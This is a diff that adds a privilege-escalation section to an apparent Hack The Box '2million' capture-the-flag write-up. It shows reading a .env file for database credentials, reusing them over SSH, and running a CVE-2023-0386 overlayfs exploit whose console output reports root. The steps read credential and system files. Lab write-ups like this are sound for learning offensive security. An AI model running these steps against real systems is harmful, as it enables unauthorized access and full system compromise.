@@ -637,3 +637,63 @@ Then:
 </details>
 
 
+3. Priv esc
+
+To user
+
+```console
+$ cat .env
+cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+
+$ cat /etc/passwd | grep home
+cat /etc/passwd | grep home
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+admin:x:1000:1000::/home/admin:/bin/bash
+
+$ sshpass -p 'SuperDuperPass123' admin@2million.htb
+
+$ cat user.txt 
+e32206b78xxxx
+```
+
+To Root:
+
+```console
+admin@2million:~$ uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+
+admin@2million:~$ lsb_release -a
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 22.04.2 LTS
+Release:	22.04
+Codename:	jammy
+
+# jammy up to 5.15.0-70.77 is vulnerable to CVE-2023-0386
+
+$ ./fuse ./ovlcap/lower ./gc &
+[1] 2655
+root@2million:~/CVE-2023-0386# [+] len of gc: 0x3ee0
+mkdir: File exists
+fuse: failed to access mountpoint ./ovlcap/lower: Permission denied
+fuse_mount: Permission denied
+./exp
+uid:0 gid:0
+[+] mount success
+ls: reading directory './ovlcap/merge': Permission denied
+total 0
+open: Permission denied
+[+] exploit success!
+sh: 1: ./ovlcap/upper/file: not found
+[1]+  Exit 1                  ./fuse ./ovlcap/lower ./gc
+
+$ sudo -s
+
+# id
+root
+```
+
